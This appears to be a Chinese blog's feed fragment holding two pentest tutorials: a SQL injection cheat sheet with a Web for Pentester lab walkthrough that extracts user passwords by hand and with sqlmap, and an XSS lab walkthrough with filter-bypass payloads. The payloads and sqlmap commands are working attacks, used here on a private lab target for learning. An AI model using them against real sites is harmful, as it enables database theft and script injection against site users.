<li>Redis</li>
</ul>
<h3 id="sql注入：将恶意的sql命令注入到后台数据库引擎达到攻击目的"><a href="#sql注入：将恶意的sql命令注入到后台数据库引擎达到攻击目的" class="headerlink" title="sql注入：将恶意的sql命令注入到后台数据库引擎达到攻击目的"></a>sql注入：将恶意的sql命令注入到后台数据库引擎达到攻击目的</h3><p><img src="/images/sqli.jpg" alt="sqli"></p>
<blockquote>
<p><strong>可输入的地方都可能存在漏洞</strong></p>
</blockquote>
<p><strong>注入原理：</strong><br> SQL注入漏洞的形成原因：用户输入的数据被SQL解释器执行</p>
<h3 id="sql注入测试"><a href="#sql注入测试" class="headerlink" title="sql注入测试"></a><strong>sql注入测试</strong></h3><p><strong>1.数字型</strong><br> 猜测SQL语句：<br>select 字段名 from 表名 where id = 1；</p>
<blockquote>
</blockquote>
<p> 1.<a href="http://www.sql.com/xxx.php?id=1" target="_blank" rel="noopener">http://www.sql.com/xxx.php?id=1</a>              假设ID为存在注入的参数<br> 2.<a href="http://www.sql.com/xxx.php?id=1‘" target="_blank" rel="noopener">http://www.sql.com/xxx.php?id=1‘</a>             语句报错<br> 3.<a href="http://www.sql.com/xxx.php?id=1" target="_blank" rel="noopener">http://www.sql.com/xxx.php?id=1</a> and 1=1      页面正常返回结果<br> 4. <a href="http://www.sql.com/xxx.php?id=1" target="_blank" rel="noopener">http://www.sql.com/xxx.php?id=1</a> and 1=2      页面返回错误</p>
<p>如果以上几个测试步骤结果全部满足，就可能存在sql注入漏洞。</p>
<p>  数字型注入一般出现在asp php等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=1，PHP会自动把ID的数据类型推导为int类型，若是 id=1 and 1=1，则把ID推导为string类型。</p>
<p><strong>2.字符型</strong></p>
<blockquote>
</blockquote>
<p>1.<a href="http://www.sql.com/xxx.php?id=1" target="_blank" rel="noopener">http://www.sql.com/xxx.php?id=1</a>                      假设ID为存在注入的参数<br>2.<a href="http://www.sql.com/xxx.php?id=1‘" target="_blank" rel="noopener">http://www.sql.com/xxx.php?id=1‘</a>                     语句报错<br>3.<a href="http://www.sql.com/xxx.php?id=1&#39;" target="_blank" rel="noopener">http://www.sql.com/xxx.php?id=1&#39;</a> and 1=1 and ‘1’=’1  页面正常返回结果<br>4.<a href="http://www.sql.com/xxx.php?id=1&#39;" target="_blank" rel="noopener">http://www.sql.com/xxx.php?id=1&#39;</a> and 1=2 and ‘1’=’1  页面返回错误</p>
<p><strong>3.搜索型</strong></p>
<blockquote>
</blockquote>
<p>1.<a href="http://www.sql.com/xxx.php?search=test" target="_blank" rel="noopener">http://www.sql.com/xxx.php?search=test</a>            假设search为存在注入的参数<br>2.<a href="http://www.sql.com/xxx.php?search=test&#39;" target="_blank" rel="noopener">http://www.sql.com/xxx.php?search=test&#39;</a>                 语句报错<br>3.<a href="http://www.sql.com/xxx.php?search=test%&#39;" target="_blank" rel="noopener">http://www.sql.com/xxx.php?search=test%&#39;</a> and 1=1 and ‘%’=’  页面正常返回结果<br>4.<a href="http://www.sql.com/xxx.php?search=test%&#39;" target="_blank" rel="noopener">http://www.sql.com/xxx.php?search=test%&#39;</a> and 1=2 and ‘%’=’   页面返回错误</p>
<p><strong>一般的sql注入语句：</strong></p>
<p><strong>判断SQL注入</strong><br><code>and 1=1、and 1=2</code><br><strong>字段长度</strong><br><code>and 1=2 union select 1,2,3,4,5</code><br><strong>爆破数据库信息</strong><br> <code>① and 1=2 union all select version()/database()/user()</code><br> <code>②and 1=2 union all select @@global.version_compile_os from mysql.</code><br><code>③and ord(mid(user(),1,1))=114 /* 返回正常说明为root</code><br><strong>暴库</strong><br><code>and 1=2 union select 1,2,3,SCHEMA_NAME,5 from</code><br><strong>暴表</strong><br><code>and 1=2 union select 1,2,3,TABLE_NAME,5 from information_schema.TABLES where TABLE_SCHEMA=database()  数据库(十六进制)</code><br><strong>暴字段</strong><br><code>and 1=2 Union select 1,2,3,COLUMN_NAME,5 from information_schema.COLUMNS where TABLE_NAME= TABLE_NAME 表名(十六进制)</code><br><strong>暴内容</strong><br><code>and 1=2 Union select 1,2,3, 字段名,5 from 表名 limit 0,1</code><br> <strong>条件语句 <em>8<br> <code>①SELECT IF(1=1, true, false) ②SELECT CASE WHEN 1=1 THEN true ELSE false END;</code><br> *</em>盲注</strong><br> <code>①AND SELECT SUBSTR(user(),1,1) FROM information_schema.tables=  ‘r’</code><br> <code>②AND SELECT ord(SUBSTR(user(),1,1)) FROM information_schema.tables = 114</code><br><strong>延时盲注 **<br><code>①AND (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(&#39;true&#39;)), false))</code><br><code>②AND (IF(MID(version(),1,1) LIKE 5, SLEEP(10), false))</code><br> **报错注入</strong><br> <code>①and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x--)a);</code><br> <code>②and?extractvalue(1,?concat(0x5c,?(select?table_name?from?information_schema.tables?limit?1)));</code><br> <code>③and?1=(updatexml(1,concat(0x3a,(select user())),1))</code><br> <code>④Exp(~(select * from (select user())a))</code><br> <code>⑤select * from(select * from mysql.user a join mysql.user b)c;</code><br> <code>⑥select * from(select * from mysql.user a join mysql.user b using(Host))c;</code></p>
<h3 id="实例—Web-for-pentester"><a href="#实例—Web-for-pentester" class="headerlink" title="实例—Web for pentester"></a>实例—Web for pentester</h3><ul>
<li>进入到搭建的环境中，第一步判断是否有注入点<br><img src="/images/sql1.png" alt="sql1"><br>在url后加单引号’ 发现报错，继续添加and 1=1 %23，文章返回正常，则存在注入点<br><img src="/images/sql2.png" alt="sql2"><br>  <code>192.168.235.128/sqli/example1.php?name=root&#39; and 1=1 %23</code><br><img src="/images/sql3.png" alt="sql3"></li>
<li>接下来判断字段长度<br><code>order by X %23</code><br> <img src="/images/sql4.png" alt="sql4"><br>在字段长为6时错误，5时正确，字段长度为5<br> <img src="/images/sql5.png" alt="sql5"></li>
<li>判断字段位置<br><img src="/images/sql6.png" alt="sql6"><br>由图得知字段位置</li>
<li>爆数据库名称<br><code>http://192.168.235.128/sqli/example1.php?name=root&#39; and 1=2 union select 1,SCHEMA_NAME,3,4,5 from information_schema.SCHEMATA %23</code><br><img src="/images/sql7.png" alt="sql7"></li>
<li>爆表<br><code>http://192.168.235.128/sqli/example1.php?name=root&#39; and 1=2 union select 1,TABLE_NAME,3,4,5 from information_schema.tables %23%</code><br>代码：<code>and 1=2 union select 1,2,3,TABLE_NAME,5 from information_schema.TABLES where TABLE_SCHEMA=database() %23/*数据库(十六进制)</code></li>
<li>爆字段<br><code>http://192.168.235.128/sqli/example1.php?name=root&#39; and 1=2 union select 1,COLUMN_NAME,3,4,5 from information_schema.COLUMNS where TABLE_NAME=0x7573657273 %23</code><br>代码：`and 1=2 Union select 1,COLUMN_NAME,3,4,5 from information_schema.COLUMNS where TABLE_NAME= users %23 /<em>表名(十六进制<br>*</em>注**：此处的表名应转为16进制（<a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制转换器</a>）</li>
</ul>
<p><img src="/images/sql8.png" alt="sql8"></p>
<ul>
<li>爆内容<br><code>http://192.168.235.128/sqli/example1.php?name=root‘ and 1=2 Union select 1,id,passwd,4,5 from users %23</code><br><img src="/images/sql9.png" alt="sql9"><br>到这基本步骤就完成了，也可以用工具来跑出这些数据<h3 id="使用sqlmap"><a href="#使用sqlmap" class="headerlink" title="使用sqlmap"></a><strong>使用sqlmap</strong></h3></li>
<li>命令：<code>sqlmap.py -u http://192.168.235.128/sqli/example1.php?name=root --dbs</code><br>得到数据库信息和数据库名称，即为爆库<br><img src="/images/sql10.png" alt="sql10"></li>
<li>命令：<code>sqlmap.py -u http://192.168.235.128/sqli/example1.php?name=root -D exercises --tables</code><br>列出该选中数据库的表，即为爆表<br><img src="/images/sql11.png" alt="sql11"></li>
<li>命令<code>sqlmap.py -u http://192.168.235.128/sqli/example1.php?name=root -D exercises -T users --columns</code><br>列出选中数据库中的表下的字段，即为爆字段<br><img src="/images/sql12.png" alt="sql12"></li>
<li>命令<code>sqlmap.py -u http://192.168.235.128/sqli/example1.php?name=root -D exercises -T users -C id,passwd --dump</code><br>列出字段内容，即为爆内容<br><img src="/images/sql13.png" alt="sql13"></li>
</ul>
<p>sqlmap参数<br>-D：指定数据库名称<br>-T：指定要列出字段的表<br>–columns：指定列出字段<br>-C ：指定要暴的字段<br>–dump：将结果导出</p>
]]></content>
  </entry>
  <entry>
    <title>Pentester of XSS</title>
    <url>/2018/05/21/Pentester-of-XSS/</url>
    <content><![CDATA[<p> <strong>进入到web for pentester 中，对XSS进行测试</strong><br><img src="/images/XSS/xss1.png" alt="1"></p>
<h3 id="example1-第一题比较简单，常规的就可以"><a href="#example1-第一题比较简单，常规的就可以" class="headerlink" title="example1.第一题比较简单，常规的就可以"></a>example1.第一题比较简单，常规的就可以</h3><p><img src="/images/XSS/xss2.png" alt="2"></p>
<h3 id="example2-就要进行简单的绕过了"><a href="#example2-就要进行简单的绕过了" class="headerlink" title="example2. 就要进行简单的绕过了"></a>example2. 就要进行简单的绕过了</h3><a id="more"></a>
<p> 使用 <code>&lt; script &gt;alert(&#39;simple&#39;)&lt; /script &gt;</code>这条是不行的<br> 按F12查看元素发现&lt; script &gt;标签被过滤掉<br><img src="/images/XSS/xss3.png" alt="3"><br> 这时候可以试着对script改动大小写看看是否能绕过<br><img src="/images/XSS/xss4.png" alt="4"><br> 弹框</p>
<h3 id="example3-发现还是标签被过滤掉，改成大写也不行，这个时候可以试试添加-lt-script-gt-标签的方法"><a href="#example3-发现还是标签被过滤掉，改成大写也不行，这个时候可以试试添加-lt-script-gt-标签的方法" class="headerlink" title="example3. 发现还是标签被过滤掉，改成大写也不行，这个时候可以试试添加&lt; script&gt;标签的方法"></a>example3. 发现还是标签被过滤掉，改成大写也不行，这个时候可以试试添加&lt; script&gt;标签的方法</h3><p><img src="/images/XSS/xss5.png" alt="5"><br>  构造俩个标签头的发现弹框了<br><img src="/images/XSS/xss6.png" alt="6"></p>
<h2 id="example4"><a href="#example4" class="headerlink" title="example4."></a>example4.</h2><p>   先使用最简单的payload发现error ，这个时候可能是标签名被过滤，可以换个标签试试，比如<code>&lt; img src=&quot;1&quot; onerror=&quot;alert(&#39;simple&#39;)&quot; &gt;</code><br><img src="/images/XSS/xss7.png" alt="7"><br>弹框</p>
<h2 id="example5"><a href="#example5" class="headerlink" title="example5."></a>example5.</h2><p> 依然按照上一条代码来试。发现error，肯定是有什么被过滤掉了，审查元素发现alert被过滤，可以更换其他标签，将alert更换为prompt<br>弹框</p>
<h2 id="example6-amp-7-这俩题的思路差不多"><a href="#example6-amp-7-这俩题的思路差不多" class="headerlink" title="example6&amp;7. 这俩题的思路差不多"></a>example6&amp;7. 这俩题的思路差不多</h2><p>先使用最简单代码，然后审查元素，发现需要闭合双引号（7需要闭合单引号）<br>然后就通过了，没什么好说的,但是在6审查元素是发现已经有script标签<br><img src="/images/XSS/xss8.png" alt="8"><br>这时候只需要写个alert或者promt进去就可以了<br><img src="/images/XSS/xss9.png" alt="9"></p>
<h2 id="example8-为存储型的"><a href="#example8-为存储型的" class="headerlink" title="example8. 为存储型的"></a>example8. 为存储型的</h2><p>随便输出个名字<code>&lt;script&gt;alert(&#39;simple&#39;)&lt;/script&gt;</code></p>
<p>审查元素</p>
<p><code>HELLO &amp;lt;script&amp;gt;alert(&#39;simple&#39;)&amp;lt;/script&amp;gt;</code></p>
<p>&lt;&gt;被HTMLEncode了。</p>
<p>对于输出在HTML中的内容，这样的过滤已经是足够了。那么漏洞在哪儿呢?</p>
<p>经过答案的提醒- -我们发现form表的目标URL是可以被构造的<br>/ 写在了&lt; form &gt;这个标签中，尝试闭合标签</p>
<p><code>http://192.168.235.128/xss/example8.php//&quot;&gt;&lt;img src=1 onerror=alert(&#39;simple&#39;)&gt;&lt;form</code>或<br><code>http://192.168.235.128/xss/example8.php//%22onsubmit=%22alert(&#39;1&#39;)</code></p>
<p>在提交的时候，会触发弹窗<br><img src="/images/XSS/xss10.png" alt="10"></p>
<h2 id="example9"><a href="#example9" class="headerlink" title="example9."></a>example9.</h2><p>这一题很特殊，这里首先查看下源码:<br>在源码中完全找不到hacker的任何字样，于是仔细百度最可疑的地方:<br>&lt; script &gt;<br>  document.write(location.hash.substring(1));<br>&lt; /script&gt;<br>找到一份资料：<a href="http://www.runoob.com/jsref/prop-loc-hash.html" target="_blank" rel="noopener">http://www.runoob.com/jsref/prop-loc-hash.html</a><br>这里可以大概看出这里是读取#后面的东西，于是乎简单的在#后面构造xss语句:<br><code>http://192.168.235.128/xss/example9.php#&lt;script&gt;alert(&#39;simple&#39;)&lt;/script&gt;</code></p>
<p><strong>列举常出现的事件</strong></p>
<h2 id="Windows事件属性"><a href="#Windows事件属性" class="headerlink" title="Windows事件属性"></a>Windows事件属性</h2><p>|事件|    作用<br>| ——–   | —–:  | :—-:  |<br>|onerror|    在错误发生时运行的脚本<br>|onload    |页面结束加载之后触发</p>
<h2 id="Keyboard-事件"><a href="#Keyboard-事件" class="headerlink" title="Keyboard 事件"></a>Keyboard 事件</h2><p>|事件|    作用<br>| ——–   | —–:  | :—-:  |<br>|onkeydown|    在用户按下按键时触发<br>|onkeypress|    在用户敲击按钮时触发<br>|onkeyup|    当用户释放按键时触发</p>
<h2 id="鼠标（Mouse）事件"><a href="#鼠标（Mouse）事件" class="headerlink" title="鼠标（Mouse）事件"></a>鼠标（Mouse）事件</h2><p>|事件|    作用<br>| ——–   | —–:  | :—-:  |<br>|onclick|    元素上发生鼠标点击时触发<br>|onmousedown|    当元素上按下鼠标按钮时触发<br>|onmousemove|    当鼠标指针移动到元素上时触发。<br>|onmouseover|    当鼠标指针移动到元素上时触<br>|onmouseout|    当鼠标指针移出元素时触发<br>|onmouseup|    当在元素上释放鼠标按钮时触发</p>
<h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>img 元素向网页中嵌入一幅图像。<br>请注意，从技术上讲， 标签并不会在网页中插入图像，而是从网页上链接图像。 标签创建的是被引用图像的占位空间。<br> 标签有两个必需的属性：src 属性 和 alt 属性</p>
<p>凡是支持事件的HTML标签都是可以弹窗的</p>
<h2 id="列举出一些支持事件的HTML常见标签"><a href="#列举出一些支持事件的HTML常见标签" class="headerlink" title="列举出一些支持事件的HTML常见标签"></a>列举出一些支持事件的HTML常见标签</h2><p>|标签|    作用<br>| ——–   | —–:  | :—-:  |<br>|a|    定义超链接，用于从一张页面链接到另一张页面,最重要的属性是 href 属性，它指示链接的目标<br>|article|    规定独立的自包含内容一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发<br>|audio|    定义声音，比如音乐或其他音频流<br>|b    |规定粗体文本<br>|body|    定义文档的主体，包含文档的所有内容<br>|br    |只是简单地开始新的一行<br>|button    |定义一个按钮<br>|iframe    |会创建包含另外一个文档的内联框架<br>|img|    向网页中嵌入一幅图像<br>|select    |可创建单选或多选菜单<br>|style|    用于为 HTML 文档定义样式信息<br>|textarea|    标签定义多行的文本输入控件<br>|video|    定义视频，比如电影片段或其他视频流</p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
</search>
